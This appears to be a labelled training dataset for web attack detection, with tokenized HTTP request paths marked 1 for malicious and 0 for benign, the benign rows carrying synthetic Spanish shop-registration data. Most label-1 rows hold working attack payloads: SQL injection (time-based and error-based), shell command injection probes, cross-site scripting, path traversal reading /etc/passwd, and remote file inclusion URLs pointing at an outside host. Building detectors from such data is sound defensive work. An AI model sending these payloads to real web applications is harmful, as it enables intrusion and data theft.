request	label
/ string / modo = registro & login = lennard2 & password = segundar & nombre = armelio & apellidos = gochez & email = shankley @ discon . sz & dni = 25054750e & direccion = c /  + fuente + del + rey ,  + s / n ,  +  & ciudad = gavilanes & cp = 36110 & provincia = salamanca & ntc = 679646557157740 & b1 = registrar 	1
/ string / strings / parameters = 1 '  )  and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 ) 	1
/ string / strings / parameters = calle barrio carmelo 2 	0
/ 4403388 / 	0
/ string / strings / parameters = muskiz 	0
"/ string / strings / parameters = 1 ""  ""  )  )  )  or 7427 = dbms_pipe . receive_message ( chr ( 116 )  |  | chr ( 87 )  |  | chr ( 90 )  |  | chr ( 109 )  , 5 )  -- "	1
/ 000095754 / 	0
/ javascript / redirect . lib 	0
/ inc / articles . inc . php ? globals [ cheminmodules ]  = xxpathxx 	1
/ string / strings / parameters = 9280522239849881 	0
/ string / strings / parameters = canals beramendi 	0
/ category1015 / 	0
/ genericdrugs_2 / 	0
/ javascript / queries . jhtml 	0
/ jmha4623q / 	0
/ string / modo = entrar & login = dionysus & pwd = any ?  set-cookie :  + tamper = 5765205567234876235 & remember = on & b1 = entrar 	1
/ string / strings / parameters = saluotto cunill 	0
/ string / strings / parameters = 1 ; select dbms_pipe . receive_message ( chr ( 66 )  |  | chr ( 67 )  |  | chr ( 79 )  |  | chr ( 101 )  , 5 )  from dual --  vykx 	1
/ string / str =  $  ( echo srsafa )   str1 =  $  {  # str }   if  [  3 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  | 	1
/ string / modo = entrar & login = mccreano & pwd = rascadura & remember = off & b1 = entrar 	0
/ 117-34 / 	0
/ string / strings / parameters = oliva 	0
"/ string / strings / parameters = ""   str =  $  ( echo synsac )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  ' "	1
"/ string / strings / parameters = -2925 %  ""  ""  or make_set ( 9354 = 9354 , 7185 )  and  ""  ""  %  ""  ""  =  ""  "" "	1
/ meebomap-thumb / 	0
"/ string / strings / parameters = ""  ; echo uzgzpc $  (  ( 74 + 69 )  )  $  ( echo uzgzpc ) uzgzpc & "	1
/ personal_ads / 	0
/ cacti / apexec . pl ? etype = odp & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 . html & passurl =  / category / 	1
/ string / modo = insertar & precio = 5639 & b1 = confirmar 	0
/ string / strings / parameters = lacruz morey 	0
/ string / strings / parameters = galacho 	0
"/ main . php ? stuff =  "" ping \ x0b-w \ x0b7000 \ x0b-n \ x0b1 \ x0b4 . 3 . 2 . 1 | rem \ x0b "	1
/ sparrow_homepage / 	0
/ javascript / base . exe 	1
/ 001330 / 	0
/ string / strings / parameters = milford1 	0
/ launch . jsp ? nfuse_application =  > alert ( document . cookie )  ;  <  / script > 	1
/ cgi-bin / _head . php ? _zb_path =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
"/ string / strings / parameters = < div style =  ""  "" width :  expression ( alert (  ' xss '  )  )  ;  ""  ""  > "	1
/ string / strings / parameters = 1 )  where 2679 = 2679 or 4915 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  -- 	1
/ string / strings / parameters = ) print (  ` echo qqgyps `  .  ` echo  $  (  ( 10 + 39 )  )  `  .  ` echo qqgyps `  .  ` echo qqgyps `  )  ;  \  \ qqgyps 	1
"/ en-us / esmozg5d . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = inescourt7 @ citycvs . mil 	0
/ 591968 / 	0
/ icon_views / 	0
"/ string / strings / parameters = -4728 ""  ""  )  )  as ndri where 3278 = 3278 or make_set ( 9354 = 9354 , 7185 )  -- "	1
/ string / strings / parameters = -2979 '  )  )  as klou where 7092 = 7092 union all select 7092 , 7092 -- 	1
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo dkkeqz )   &  &  str1 =  $  {  # str }   &  &   [  8 -eq  $  { str1 }   ]   &  &  sleep 1  & 	1
/ msg217289 / 	0
/ string / strings / parameters = 2785803703823487 	0
/ 000022421 / 	0
"/ string / strings / parameters = 1 %  ""  ""  )  )  )  and make_set ( 8191 = 7813 , 7813 )  and  (  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / modo = registro & login = alexi & password = cuerda & nombre = donardo & apellidos = paracoll '  ,  ' 0 '  )  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & email = filho @ encuentrodominios . is & dni = 01722111d & direccion = enric + granados + 137 ,  +  & ciudad = ruesca & cp = 47248 & provincia = alicante & ntc = 0825150389138142 & b1 = registrar 	1
/ string / strings / parameters = 8795473491595155 	0
/ string / strings / parameters = monopolizador 	0
/ daum_event / 	0
/ string / modo = registro & login = legrandv & password = vellora & nombre = ursulina & apellidos = cabieces + amayuela & email = comerate . foldi @ ofertaschinas . dm & dni = 48435837e & direccion = calle + fray + luis + de + leon + 141 ,  + 7 ? c & ciudad = andoain & cp = 46815 & provincia = zamora & ntc = 2070765320009143 & b1 = registrar 	0
/ javascript / _source . exe 	1
/ leftnav-questionnaire / 	0
/ string / modo = registro & login = jarvie & password = 9p30a & nombre = basilia & apellidos = gutarra + marimon & email = patey @ suncorp . st & dni = 15885803w & direccion = c /  + melilla ,  + 149 ,  +  & ciudad = vila-sana & cp = 44340 & provincia = toledo & ntc = 4030398318773720 & b1 = registrar 	0
/ liquorlock-709843 / 	0
/ string / strings / parameters = < svg id = javascript : alert ( 1337 )  onload = location = id > 	1
/ string / strings / parameters = quevedo y quintana s / n ,  4-h 	0
/ string / strings / parameters = 28991243l 	0
/ string / modo = insertar +  & precio = 346 & b1 = confirmar 	1
/ string / strings / parameters = ' echo $ ifsfyuxpa $  (  ( 17 + 24 )  )  $  ( echo $ ifsfyuxpa ) fyuxpa ' 	1
/ o & o defrag v1 / 	0
/ string / modo = registro & login = kui-soon & password = a2rava46e & nombre = palmira & apellidos = espasa + radillo & email = provine @ acchportugal . pm & dni =  +  & direccion = pl .  + merced ,  + 147 +  & ciudad = arags + del + puerto & cp = 17860 & provincia = valencia & ntc = 6653520296014464 & b1 = registrar 	1
/ string / strings / parameters = |   [  3 -ne  $  ( echo ehxctp  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ javascript / e . exe 	1
/ javascript / web-console / 	0
/ javascript / buy . ora 	0
/ string / strings / parameters = -9531 '  )  )  )  union all select 4076 , 4076 # 	1
"/ o35zot2r . pl ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ azcrfs8d . kspx ?  < meta http-equiv = set-cookie content =  "" testjpdr = 9205 ""  > "	1
/ string / strings / parameters = c /  vilagarcia de arousa ,  18 	0
"/ string / strings / parameters = -7514 %  ""  ""  )  )  )  or 2448 = 8797 # "	1
/ javascript / changes . py 	0
/ string / modo = insertar & precio = 6657 & b1 = pasar + por + caja 	0
/ string / strings / parameters = \ x3csvg /  < svg / onload = alert (  )  /  /  >  \ x3e 	1
/ javascript / 17 . ini 	0
"/ string / strings / parameters = -8651 ""  ""  )  where 8391 = 8391 union all select 8391 , 8391 # "	1
/ javascript / custom-log . png 	0
/ string / strings / parameters = < embed / code =  /  / goo . gl / nlx0p ? 	1
/ string / strings / parameters = gnaeding 	0
/ string / strings / parameters = 1 '  )  as rvli where 4427 = 4427 ; call regexp_substring ( repeat ( right ( char ( 2385 )  , 0 )  , 500000000 )  , null )  -- 	1
/ recordings / webadmin . php ? show =  / etc / passwd 	1
/ help . php ? q = ver & rem ; 	1
"/ string / strings / parameters = < meta http-equiv = set-cookie content =  "" testttvs = 7163 ""  > "	1
/ sc0605 / 	0
/ en-us / account / smpwservicescgi . exe 	1
/ string / strings / parameters = 3154021344584169 	0
/ noadware_v4 / 	0
/ scripts / index . php ? src = 1 & _common = 1 & time = 1331919221 & action = show_view & module = calendarmodule & view =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 	1
/ weekend_watch / 	0
/ string / strings / parameters = 87356578w 	0
/ javascript / vendors . log 	0
/ thirdwaved / 	0
"/ string / strings / parameters = ' echo $ ifsjwhawx $  (  ( 24 + 49 )  )  $  ( echo $ ifsjwhawx ) jwhawx "" "	1
/ manual / index . jsp 	0
/ string / modo = registro & login = schyndel & password = trufaldina & nombre = yadia & apellidos = puerta + garreta & email = fleur @ drae2 . kh & dni = 52864416c & direccion = parque + de + despeaperros ,  + 159 +  & ciudad = algerriany ?  set-cookie :  + tamper = 5765205567234876235 & cp = 47175 & provincia = zaragoza & ntc = 9535422521832781 & b1 = registrar 	1
"/ string / strings / parameters = -5757 %  ""  ""  )  or 6872 = 6872 and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ script / _conf / core / common-tpl-vars . php ? confdir = http :  /  / 192 . 168 . 202 . 118 : 8080 / 2aibfaczmac8 ?  ? 	1
/ string / strings / parameters = 1 '  )  where 6634 = 6634 or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  )  -- 	1
/ javascript / soapmonitor . bak 	0
"/ string / strings / parameters = < div style =  ""  "" behaviour :  url (  [ link to code ]  )  ;  ""  ""  > "	1
/ index_j / 	0
/ 306412 / 	0
/ string / strings / parameters = prosdcimo surinyac 	0
/ string / strings / parameters = ; echo $ ifstreosx $  (  ( 82 + 26 )  )  $  ( echo $ ifstreosx ) treosx 	1
/ string / strings / parameters = alcojor larenas 	0
/ ese brown - shipping and receiving / 	0
/ javascript / webmail . part 	0
/ javascript /  ~ john . old 	0
"/ 8t9v8k7x . pl ?  < meta http-equiv = set-cookie content =  "" testhvje = 9403 ""  > "	1
/ javascript / backup . dump 	0
/ string / strings / parameters = 1 '  )  ; begin dbms_lock . sleep ( 5 )  ;  end 	1
"/ string / strings / parameters = & lt ; a href =  \  "" http &  # 58 ;  /  / 66 &  # 46 ; 102 &  # 46 ; 7 &  # 46 ; 147 /  \  ""  & gt ; xss & lt ;  / a & gt ; "	1
/ string / strings / parameters = palmario 	0
"/ ygkjkngd . cgi ?  < meta http-equiv = set-cookie content =  "" testnago = 4518 ""  > "	1
/ pmse_ov / 	0
/ stereophonics live in melkweg holland / 	0
/ string / strings / parameters = nimia 	0
/ javascript / course . exe 	1
"/ string / strings / parameters = ""  |   [  2 -ne  $  ( echo jyvqfk  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' "	1
/ examples / jsp / num / am . pl ? path = bin / mozilla & action = display_form & file = users / etc / passwd & login = root + login 	1
/ kochece - sugar hill / 	0
/ main . php ? logout =  \ x0duname  > q49774432  # 	1
/ animated3gpicon / 	0
/ string / strings / parameters = -4428 )  or 3038 = 3038 	1
/ string / strings / parameters = piedramillera 	0
"/ string / strings / parameters = -3933 %  ""  ""  )  )  or elt ( 8142 = 2978 , 2978 )  and  (  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ javascript / thumb . gif 	0
/ string / strings / parameters = go1mador 	0
/ 1173828 / 	0
/ string / strings / parameters = 2169 	0
/ string / strings / parameters = ; echo skjoij $  (  ( 68 + 83 )  )  $  ( echo skjoij ) skjoij 	1
/ scripts / livre_include . php ? no_connect = lol & chem_absolu = http :  /  / xxxxxx .  / 	1
/ hw3 . cgi ? daysonly = 0 )  . system (  ' id '  )  .  ( 	1
"/ main . php ? stuff =  ""  & del ; q86839174 & rem ; "	1
/ string / strings / parameters = 3161746053397457 	0
/ nieuws_tilburg / 	0
/ bs20061112_350663 / 	0
"/ l4fz1dqw . cfc ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
"/ string / strings / parameters = < script a =  `  >  `  src =  "" http :  /  / xss . cx / xss . js ""  >  <  / script > "	1
/ string / strings / parameters = d :  / inetpub / wwwroot / global . asa 	1
/ sitemapflash / 	0
/ javascript / porn . key 	0
/ t14199 / 	0
"/ rpxyx07v . jspa ?  < meta http-equiv = set-cookie content =  "" testbnli = 1975 ""  > "	1
/ javascript / crm . txt 	0
/ javascript / jakarta . cpp 	0
"/ string / strings / parameters = 1 %  ""  ""  )  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  (  ""  ""  %  ""  ""  =  ""  "" "	1
/ string / strings / parameters = 6511294088626969 	0
/ javascript / subscribe . cs 	0
/ cgi-bin / modules . php ? mod = fm & file =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00 & bn = fm_d1 	1
/ 179117 / 	0
/ scriptpath / footers . php ? tinybb_footers = http :  /  / 192 . 168 . 202 . 118 : 8080 / moclyxlwqyfjnp ? 	1
/ javascript / scripts . jsf 	0
/ string / strings / parameters = -9120 '  )  )  or 8571 = 8571 -- 	1
/ snippetmaster / includes / vars . inc . php ? _session [ script_path ]  = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ? 	1
/ string / strings / parameters = mathius 	0
/ video_lalternat / 	0
/ transport-security / 	0
/ string / strings / parameters = 98993276b 	0
/ 10877917 / 	0
/ javascript / piranha . tmp 	0
"/ string / strings / parameters = 1 ""  ""  and row ( 6237 , 7469 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 6237 = 6237 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ""  "" nzgn ""  ""  =  ""  "" nzgn "	1
/ mze5odc4 / 	0
/ string / strings / parameters = 1 '  ; waitfor delay  ' 0 : 0 : 5 '  and  ' gsvt '  =  ' gsvt 	1
/ string / strings / parameters = rodrigo caro ,  16 	0
/ joomla symbol color cmyk flat / 	0
/ string / modo = registro & login = ruzycki & password = aviso & nombre = hugo & apellidos = estrada & email = burston_autin @ 943 . py & dni = 26397342n & direccion = c /  + queralbs ,  + 185 + 10-g & ciudad = santa + eulalia & cp = 10828 & provincia = valencia |  & ntc = 0317961350004584 & b1 = registrar 	1
/ string / strings / parameters = bienia 	0
/ string / strings / parameters = 1 '  +  ( select mhfn where 2425 = 2425 ; select count (  *  )  from generate_series ( 1 , 5000000 )  )  +  ' 	1
/ 187656 / 	0
/ string / strings / parameters = terrill 	0
/ nav-archives1 / 	0
/ string / strings / parameters = *  & apos ; 	1
/ string / modo = registro & login = philips & password = balconaje & nombre = hansel & apellidos = ponseti + vilarrasa & email = zonis-paola @ interanuncios . hk & dni = 52864416c & direccion = calle + el + labrador + s / n + 13c & ciudad = san + isidro & cp = 04868 & provincia = cuenca & ntc = 219909426286098a & b1 = registrar 	1
/ recordings / a1disp3 . cgi ?  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd 	1
/ string / strings / parameters = 983tau027iv1 	0
/ 145297 / 	0
/ string / strings / parameters = mcallum 	0
/ buehlertal / 	0
/ string / strings / parameters = pericas espaulella 	0
/ string / strings / parameters = idalio 	0
/ 20030115-9 / 	0
/ ch-kernel / 	0
/ string / strings / parameters = 1 '  +  ( select  ' vtyw '  where 7950 = 7950 order by 1 -- 	1
/ 191744 / 	0
/ 113997 / 	0
/ string / strings / parameters = 7057231009442608 	0
/ gnubanner / 	0
/ string / modo = registro & login = ballarte & password = mist66l & nombre = zorella & apellidos = morera & email = cossar @ asdn . be & dni = 36813756w & direccion = calle + alvarez + de + castro + 197 ,  +  & ciudad = vila-real & cp = 19160 & provincia = jan & ntc = 966948476857778 & b1 = registrar 	1
/ examples / jsp / cal / sawmill6cl . exe ? ho +  { complete_version } 	1
/ string / strings / parameters = 1 )  ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  -- 	1
/ javascript / _adm . cpp 	0
/ icon2106940 / 	0
/ string / modo = registro & login = jamaal & password = culminar & nombre = yasm & apellidos = porquet + camarillo & email = rapaport . iloloubek @ ajuntamentbarcelona20 . com & dni = 11901410z & direccion = calle + calderon + de + la + barca ,  + 141 +  & ciudad = huelva & cp = 43761 & provincia = madrid & ntc = 3409473973742176 & b1 = registrar 	0
/ pxagj7n7 . asp ?  < script > cross_site_scripting . nasl <  / script > 	1
/ string / modo = registro & login = kolahi45 & password = o5 $ 57t4 & nombre = segismundo & apellidos = torr & email = unkel-richler @ nanogenerador . bu & dnia = 62093064x & direccion = calle + puerto + oncala ,  + 80 ,  + 7 ? g & ciudad = almazul & cp = 20495 & provincia = navarra & ntc = 9824241120494731 & b1 = registrar 	1
/ configureiis / 	0
/ 0621talton21 / 	0
/ string / strings / parameters = calzada rebassa 	0
/ sample-four / 	0
/ 32bitservicemonitor97301 / 	0
/ examples / jsp / jsp2 / jspx / core / editor . php ? editor_insert_bottom =  / etc / passwd 	1
/ string / modo =  ?  & precio = 1510 & b1 = confirmar 	1
/ string / strings / parameters = rozaln del monte 	0
/ string / strings / parameters = 1 where 5466 = 5466 and 2388 = benchmark ( 5000000 , md5 ( 0x6d457153 )  )  # 	1
/ string / strings / parameters = 1 '  )  and elt ( 4249 = 4249 , 7259 ) 	1
/ string / strings / parameters = 1 ,  ( select  ( case when  ( 6857 = 7623 )  then 1 else 6857 *  ( select 6857 from information_schema . character_sets )  end )  ) 	1
/ string / strings / parameters = 0446161008040688 	0
/ string / strings / parameters = torremocha de jiloca 	0
/ string / strings / parameters = mercantesca 	0
/ _w0qqfromzr4qqsacatz74816qqsocmdzlistingitemlist / 	0
/ string / strings / parameters = 34309 	0
/ top . php ? stuff = ping ; -w ; 7000 ; -n ; 1 ; 1 . 2 . 3 . 4 | rem ; 	1
"/ qhvu0pdg . jsp ?  < meta http-equiv = set-cookie content =  "" testchuc = 2100 ""  > "	1
/ cgi / texis . exe / junk 	1
/ string / strings / parameters = jailyn 	0
